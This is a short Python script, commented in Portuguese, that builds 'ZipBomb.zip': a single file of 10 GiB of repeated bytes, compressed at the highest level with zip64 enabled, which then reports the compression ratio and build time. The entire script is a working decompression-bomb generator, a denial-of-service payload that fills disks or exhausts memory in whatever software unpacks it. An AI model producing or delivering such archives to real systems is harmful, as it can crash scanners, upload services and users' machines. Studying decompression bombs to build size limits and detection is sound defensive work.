import zipfile
import os
import time

tamanho_total = (10 * (1024 ** 3))
tamanho_bloco = (64 * (1024 ** 2))

bloco = b"A" * tamanho_bloco

inicio = time.perf_counter()

with zipfile.ZipFile(
    "ZipBomb.zip",
    "w",
    compression=zipfile.ZIP_DEFLATED,
    compresslevel=9
) as arquivo:

    with arquivo.open("ZipBomb.txt", "w", force_zip64=True) as destino:

        restante = tamanho_total

        while restante > 0:
            quantidade = min(restante, tamanho_bloco)
            destino.write(bloco[:quantidade])
            restante -= quantidade

            progresso = ((tamanho_total - restante) / tamanho_total) * 100
            print(f"Progresso: {progresso:.2f}%", end="\r")

fim = time.perf_counter()

tamanho = os.path.getsize("ZipBomb.zip")

print(f"Tamanho compactado: {tamanho:,} bytes")
print(f"Tamanho original: {tamanho_total:,} bytes")
print(f"Taxa de compressão: {tamanho_total / tamanho:.2f}x")
print(f"Tempo: {fim - inicio:.2f} segundos")